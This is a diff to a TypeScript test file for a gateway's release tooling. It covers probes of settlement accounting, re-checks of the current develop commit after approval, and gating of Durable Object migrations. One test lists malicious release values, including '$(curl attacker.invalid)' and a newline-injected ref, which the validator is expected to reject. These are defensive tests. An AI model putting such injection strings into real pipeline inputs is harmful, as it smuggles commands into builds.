@@ -7,6 +7,7 @@ import {
   resolveCurrentRelease,
   validateConvexDryRun,
   validateConvexTarget,
+  validateCurrentDevelop,
   validateProbeOptions,
   validateRelease,
 } from "./release-contract.mjs";
@@ -15,11 +16,19 @@ import {
   run as runReleaseState,
   uploadedVersion,
 } from "./release-state.mjs";
+import {
+  classifyLifecycleChange,
+  parseJsonc,
+  remoteLifecycleMatches,
+  run as runLifecycle,
+} from "./release-lifecycle.mjs";
 
 const SHA = "a".repeat(40);
 const OLD_SHA = "b".repeat(40);
 const WEB = "https://web.test";
 const GATEWAY = "https://gateway.test";
+const ACCOUNTING = "https://convex.test/release-probe-accounting";
+const REQUEST_ID = "123e4567-e89b-42d3-a456-426614174000";
 
 function response(body: unknown, init: ResponseInit = {}) {
   return new Response(
@@ -58,6 +67,8 @@ function fullOptions(overrides: Record<string, unknown> = {}) {
     contentType: "application/json",
     requestBody: '{"probe":true}',
     apiKey: "secret-key",
+    accountingUrl: ACCOUNTING,
+    probeSecret: "release-probe-secret",
     readinessAttempts: 1,
     readinessIntervalMs: 0,
     sleep: vi.fn(),
@@ -65,8 +76,40 @@ function fullOptions(overrides: Record<string, unknown> = {}) {
   };
 }
 
-function successfulFetch(meteredCost = "3") {
-  return vi
+function settledAccounting(cost = 3) {
+  const fee = Math.floor((cost * 500) / 10_000);
+  return response(
+    {
+      status: "settled",
+      accounting: {
+        requestId: REQUEST_ID,
+        settlementRefId: `settle:${REQUEST_ID}`,
+        usage: {
+          credits: cost,
+          status: 200,
+          method: "POST",
+          endpoint: "/echo",
+        },
+        ledger: { kind: "usage_settlement", amount: -cost, sequence: 7 },
+        publisher: {
+          publicHandle: "acme",
+          projectSlug: "demo",
+          grossCredits: cost,
+          platformFeeCredits: fee,
+          netCredits: cost - fee,
+          status: "pending_risk",
+        },
+      },
+    },
+    { status: 200, headers: { "content-type": "application/json" } },
+  );
+}
+
+function successfulFetch(
+  meteredCost = "3",
+  accountingResponses = [settledAccounting(Number(meteredCost))],
+) {
+  const fetchMock = vi
     .fn()
     .mockResolvedValueOnce(landing())
     .mockResolvedValueOnce(health())
@@ -123,15 +166,19 @@ function successfulFetch(meteredCost = "3") {
           status: 200,
           headers: {
             "x-zevium-cost": meteredCost,
-            "x-zevium-request-id": "paid-request",
+            "x-zevium-request-id": REQUEST_ID,
           },
         },
       ),
     );
+  for (const accountingResponse of accountingResponses) {
+    fetchMock.mockResolvedValueOnce(accountingResponse);
+  }
+  return fetchMock;
 }
 
-function successfulGatewayFetch() {
-  return vi
+function successfulGatewayFetch(accountingResponses = [settledAccounting()]) {
+  const fetchMock = vi
     .fn()
     .mockResolvedValueOnce(health())
     .mockResolvedValueOnce(
@@ -178,11 +225,15 @@ function successfulGatewayFetch() {
           status: 200,
           headers: {
             "x-zevium-cost": "3",
-            "x-zevium-request-id": "paid-request",
+            "x-zevium-request-id": REQUEST_ID,
           },
         },
       ),
     );
+  for (const accountingResponse of accountingResponses) {
+    fetchMock.mockResolvedValueOnce(accountingResponse);
+  }
+  return fetchMock;
 }
 
 describe("release identity", () => {
@@ -191,6 +242,13 @@ describe("release identity", () => {
     expect(() => validateRelease("develop")).toThrow(/40-character git SHA/);
     expect(() => validateRelease(SHA.toUpperCase())).toThrow(
       /40-character git SHA/,
+    );
+  });
+
+  it("rejects approval-delay SHA when develop advances", () => {
+    expect(validateCurrentDevelop(SHA, SHA)).toBe(SHA);
+    expect(() => validateCurrentDevelop(SHA, OLD_SHA)).toThrow(
+      /stopped being current develop during approval/,
     );
   });
 
@@ -241,8 +299,14 @@ describe("release identity", () => {
       "gateway-cors-contract",
       "published-spec-mock",
       "metered-wallet-upstream",
+      "authoritative-usage-accounting",
     ]);
-    expect(evidence.checks.at(-1)).toMatchObject({ cost: 3, status: 200 });
+    expect(evidence.checks.at(-1)).toMatchObject({
+      cost: 3,
+      status: 200,
+      requestId: REQUEST_ID,
+      settlementRefId: `settle:${REQUEST_ID}`,
+    });
     expect(JSON.stringify(evidence)).not.toContain("secret-key");
     expect(JSON.stringify(evidence)).not.toContain("probe");
 
@@ -257,6 +321,14 @@ describe("release identity", () => {
     );
     const paidHeaders = new Headers(fetchMock.mock.calls[6][1]?.headers);
     expect(paidHeaders.get("authorization")).toBe("Bearer secret-key");
+    const accountingHeaders = new Headers(fetchMock.mock.calls[7][1]?.headers);
+    expect(fetchMock.mock.calls[7][0]).toBe(ACCOUNTING);
+    expect(accountingHeaders.get("x-release-probe-secret")).toBe(
+      "release-probe-secret",
+    );
+    expect(fetchMock.mock.calls[7][1]?.body).toBe(
+      JSON.stringify({ requestId: REQUEST_ID }),
+    );
   });
 
   it("resolves matching active identities and the one-time legacy bootstrap", async () => {
@@ -370,12 +442,15 @@ describe("release identity", () => {
       "gateway-cors-contract",
       "published-spec-mock",
       "metered-wallet-upstream",
+      "authoritative-usage-accounting",
     ]);
-    for (const [, init] of fetchMock.mock.calls) {
+    for (const [url, init] of fetchMock.mock.calls) {
       const headers = new Headers(init?.headers);
-      expect(headers.get("Cloudflare-Workers-Version-Overrides")).toBe(
-        'zevium-gateway="aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee"',
-      );
+      if (url !== ACCOUNTING) {
+        expect(headers.get("Cloudflare-Workers-Version-Overrides")).toBe(
+          'zevium-gateway="aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee"',
+        );
+      }
     }
   });
 
@@ -457,6 +532,49 @@ describe("release identity", () => {
       probeRelease(fullOptions(), successfulFetch("2")),
     ).rejects.toThrow(/differs from published discovery price/);
   });
+
+  it("rejects authoritative ledger or publisher accounting mismatch", async () => {
+    await expect(
+      probeRelease(fullOptions(), successfulFetch("3", [settledAccounting(2)])),
+    ).rejects.toThrow(/usage, ledger, or publisher accounting mismatch/);
+  });
+
+  it("fails on stale release probe credentials without leaking either secret", async () => {
+    const fetchMock = successfulFetch("3", [
+      response(
+        { error: "unauthorized" },
+        { status: 401, headers: { "content-type": "application/json" } },
+      ),
+    ]);
+    let caught: (Error & { evidence?: unknown }) | undefined;
+    try {
+      await probeRelease(fullOptions(), fetchMock);
+    } catch (error) {
+      caught = error as Error & { evidence?: unknown };
+    }
+    expect(caught?.message).toMatch(/accounting endpoint returned HTTP 401/);
+    expect(fetchMock).toHaveBeenCalledTimes(8);
+    expect(JSON.stringify(caught?.evidence)).not.toContain(
+      "release-probe-secret",
+    );
+    expect(JSON.stringify(caught?.evidence)).not.toContain("secret-key");
+  });
+
+  it("fails bounded when async usage ingest never reaches Convex", async () => {
+    const pending = () =>
+      response(
+        { status: "pending" },
+        { status: 202, headers: { "content-type": "application/json" } },
+      );
+    const sleep = vi.fn();
+    await expect(
+      probeRelease(
+        fullOptions({ readinessAttempts: 2, sleep }),
+        successfulFetch("3", [pending(), pending()]),
+      ),
+    ).rejects.toThrow(/settlement still pending/);
+    expect(sleep).toHaveBeenCalledTimes(1);
+  });
 });
 
 describe("production workflow invariants", () => {
@@ -467,6 +585,10 @@ describe("production workflow invariants", () => {
   const previewWorkflow = readFileSync(".github/workflows/preview.yml", "utf8");
   const contractWorkflow = readFileSync(
     ".github/workflows/contract-production.yml",
+    "utf8",
+  );
+  const lifecycleWorkflow = readFileSync(
+    ".github/workflows/gateway-do-lifecycle.yml",
     "utf8",
   );
 
@@ -497,6 +619,10 @@ describe("production workflow invariants", () => {
     expect(workflow).toContain("verify_web_override");
     expect(workflow).toContain("$PRODUCTION_WEB_URL/catalogue?q=&sort=newest");
     expect(workflow).toContain("release-state.mjs recover");
+    expect(workflow).toContain("rollback-contract.json");
+    expect(workflow).toContain("expanded-control-plane-contract.json");
+    expect(workflow).toContain("production-contract.json");
+    expect(workflow).toContain("release-probe-accounting");
     expect(workflow).toContain("metered-method");
     expect(workflow).not.toMatch(/smoke/i);
   });
@@ -524,6 +650,97 @@ describe("production workflow invariants", () => {
       "contract commits have no successful production marker",
     );
     expect(workflow).toContain("production-baseline.json");
+    expect(contractWorkflow).toContain("pre-contract.json");
+    expect(contractWorkflow).toContain("post-contract.json");
+    expect(contractWorkflow).toContain("release-probe-accounting");
+  });
+
+  it("re-resolves current develop and production identity after approval", () => {
+    const production = workflow.slice(workflow.indexOf("  production:"));
+    const gate = production.indexOf(
+      "Re-resolve production, gate lifecycle, and upload immutable Worker versions",
+    );
+    const baseline = production.indexOf("production-baseline.json");
+    const firstUpload = production.indexOf("wrangler versions upload --strict");
+    expect(gate).toBeGreaterThan(-1);
+    expect(production.slice(gate, baseline)).toContain(
+      'gh api "repos/$GITHUB_REPOSITORY/commits/develop" --jq .sha',
+    );
+    expect(production.slice(gate, baseline)).toContain(
+      "--current-release=true",
+    );
+    expect(production.slice(baseline, firstUpload)).toContain(
+      "assert_release_is_current",
+    );
+
+    const approvedContract = contractWorkflow.slice(
+      contractWorkflow.indexOf("  contract-production:"),
+    );
+    const contractRecheck = approvedContract.indexOf(
+      "Re-resolve approved target before production probe",
+    );
+    const paidProbe = approvedContract.indexOf("pre-contract.json");
+    const mutationRecheck = approvedContract.indexOf(
+      "Re-resolve develop and active identities immediately before mutation",
+    );
+    const convexDeploy = approvedContract.indexOf(
+      "pnpm exec convex deploy --yes",
+    );
+    expect(contractRecheck).toBeLessThan(paidProbe);
+    expect(approvedContract.slice(contractRecheck, paidProbe)).toContain(
+      'commits/develop" --jq .sha',
+    );
+    expect(mutationRecheck).toBeLessThan(convexDeploy);
+  });
+
+  it("resolves manual contract target before checkout, cache, or Mise", () => {
+    const resolver = contractWorkflow.slice(
+      contractWorkflow.indexOf("  resolve-target:"),
+      contractWorkflow.indexOf("  contract-candidate:"),
+    );
+    expect(resolver).not.toContain("environment:");
+    expect(resolver).not.toContain("actions/checkout");
+    expect(resolver).toContain("/^[0-9a-f]{40}$/");
+    expect(resolver).toContain('commits/develop" --jq .sha');
+    expect(resolver).toContain("Resolved release SHA: %s");
+
+    const candidate = contractWorkflow.slice(
+      contractWorkflow.indexOf("  contract-candidate:"),
+      contractWorkflow.indexOf("  contract-production:"),
+    );
+    const checkout = candidate.indexOf("actions/checkout@v6");
+    const cache = candidate.indexOf("actions/cache@v5");
+    const mise = candidate.indexOf("jdx/mise-action@v4");
+    expect(candidate).toContain(
+      "ref: ${{ needs.resolve-target.outputs.release }}",
+    );
+    expect(contractWorkflow).not.toContain("ref: ${{ inputs.release_sha }}");
+    expect(checkout).toBeGreaterThan(-1);
+    expect(checkout).toBeLessThan(cache);
+    expect(cache).toBeLessThan(mise);
+    for (const malicious of [
+      "develop",
+      "A".repeat(40),
+      `${SHA}\nref=develop`,
+      "$(curl attacker.invalid)",
+    ]) {
+      expect(() => validateRelease(malicious)).toThrow();
+    }
+  });
+
+  it("routes Durable Object lifecycle changes through isolated approvals", () => {
+    expect(workflow).toContain("release-lifecycle.mjs check-generic");
+    expect(workflow).toContain("zevium/gateway-do-lifecycle");
+    expect(lifecycleWorkflow).toContain("environment: gateway-do-staging");
+    expect(lifecycleWorkflow).toContain(
+      "environment: gateway-do-${{ needs.resolve-target.outputs.phase }}",
+    );
+    expect(lifecycleWorkflow).toContain(
+      "release-lifecycle.mjs check-dedicated",
+    );
+    expect(lifecycleWorkflow).toContain("wrangler deploy --strict");
+    expect(lifecycleWorkflow).not.toContain("wrangler rollback");
+    expect(lifecycleWorkflow).toContain("roll-forward");
   });
 
   it("rejects untrusted manual preview targets before checkout", () => {
@@ -719,5 +936,183 @@ describe("Cloudflare rollback evidence", () => {
     expect(state.state).toBe(
       "workers_rolled_back_control_plane_change_possible",
     );
+  });
+});
+
+describe("Durable Object lifecycle gate", () => {
+  const base = {
+    durable_objects: {
+      bindings: [{ name: "WALLET", class_name: "WalletDO" }],
+    },
+    migrations: [{ tag: "v1", new_sqlite_classes: ["WalletDO"] }],
+  };
+
+  it("parses JSONC without corrupting comment-like strings", () => {
+    expect(
+      parseJsonc(`{
+        // comment
+        "url": "https://example.test/a//b",
+        "migrations": [{ "tag": "v1", }],
+      }`),
+    ).toEqual({
+      url: "https://example.test/a//b",
+      migrations: [{ tag: "v1" }],
+    });
+  });
+
+  it("classifies class addition as explicit expansion", () => {
+    const candidate = structuredClone(base);
+    candidate.durable_objects.bindings.push({
+      name: "JOBS",
+      class_name: "JobsDO",
+    });
+    candidate.migrations.push({
+      tag: "v2",
+      new_sqlite_classes: ["JobsDO"],
+    });
+    expect(classifyLifecycleChange(base, candidate)).toMatchObject({
+      hasChange: true,
+      phase: "expand",
+      invalid: false,
+    });
+  });
+
+  it("classifies class rename and delete as explicit contraction", () => {
+    const renamed = structuredClone(base);
+    renamed.durable_objects.bindings[0] = {
+      name: "WALLET",
+      class_name: "WalletV2",
+    };
+    renamed.migrations.push({
+      tag: "v2",
+      renamed_classes: [{ from: "WalletDO", to: "WalletV2" }],
+    });
+    expect(classifyLifecycleChange(base, renamed)).toMatchObject({
+      hasChange: true,
+      phase: "contract",
+      invalid: false,
+    });
+
+    const deleted = structuredClone(base);
+    deleted.durable_objects.bindings = [];
+    deleted.migrations.push({ tag: "v2", deleted_classes: ["WalletDO"] });
+    expect(classifyLifecycleChange(base, deleted)).toMatchObject({
+      hasChange: true,
+      phase: "contract",
+      invalid: false,
+    });
+  });
+
+  it("rejects edits to applied migration history", () => {
+    const candidate = structuredClone(base);
+    candidate.migrations[0] = {
+      tag: "v1-rewritten",
+      new_sqlite_classes: ["WalletDO"],
+    };
+    expect(classifyLifecycleChange(base, candidate)).toMatchObject({
+      hasChange: true,
+      invalid: true,
+    });
+  });
+
+  it("matches candidate lifecycle against authoritative active version metadata", () => {
+    expect(
+      remoteLifecycleMatches(
+        {
+          result: {
+            resources: {
+              bindings: [
+                {
+                  type: "durable_object_namespace",
+                  name: "WALLET",
+                  class_name: "WalletDO",
+                },
+                { type: "secret_text", name: "CLERK_SECRET_KEY" },
+              ],
+              script_runtime: { migration_tag: "v1" },
+            },
+          },
+        },
+        base,
+      ),
+    ).toBe(true);
+  });
+
+  it("blocks generic Versions release for class and migration changes", () => {
+    const directory = mkdtempSync(join(tmpdir(), "zevium-lifecycle-"));
+    const active = join(directory, "active.jsonc");
+    const candidate = join(directory, "candidate.jsonc");
+    const activeVersion = join(directory, "active-version.json");
+    const expanded = structuredClone(base);
+    expanded.durable_objects.bindings.push({
+      name: "JOBS",
+      class_name: "JobsDO",
+    });
+    expanded.migrations.push({
+      tag: "v2",
+      new_sqlite_classes: ["JobsDO"],
+    });
+    writeFileSync(active, JSON.stringify(base));
+    writeFileSync(candidate, JSON.stringify(expanded));
+    writeFileSync(
+      activeVersion,
+      JSON.stringify({
+        resources: {
+          bindings: [
+            {
+              type: "durable_object_namespace",
+              name: "WALLET",
+              class_name: "WalletDO",
+            },
+          ],
+          script_runtime: { migration_tag: "v1" },
+        },
+      }),
+    );
+    expect(() =>
+      runLifecycle([
+        "check-generic",
+        `--active=${active}`,
+        `--candidate=${candidate}`,
+        `--active-version=${activeVersion}`,
+        "--marker=missing",
+      ]),
+    ).toThrow(/generic rollback is prohibited/);
+  });
+
+  it("refuses dedicated lifecycle when remote state is not reviewed base", () => {
+    const directory = mkdtempSync(join(tmpdir(), "zevium-lifecycle-drift-"));
+    const active = join(directory, "active.jsonc");
+    const candidate = join(directory, "candidate.jsonc");
+    const activeVersion = join(directory, "active-version.json");
+    const renamed = structuredClone(base);
+    renamed.durable_objects.bindings[0] = {
+      name: "WALLET",
+      class_name: "WalletV2",
+    };
+    renamed.migrations.push({
+      tag: "v2",
+      renamed_classes: [{ from: "WalletDO", to: "WalletV2" }],
+    });
+    writeFileSync(active, JSON.stringify(base));
+    writeFileSync(candidate, JSON.stringify(renamed));
+    writeFileSync(
+      activeVersion,
+      JSON.stringify({
+        resources: {
+          bindings: [],
+          script_runtime: { migration_tag: "unexpected" },
+        },
+      }),
+    );
+    expect(() =>
+      runLifecycle([
+        "check-dedicated",
+        `--active=${active}`,
+        `--candidate=${candidate}`,
+        `--active-version=${activeVersion}`,
+        "--phase=contract",
+      ]),
+    ).toThrow(/differs from reviewed active source/);
   });
 });
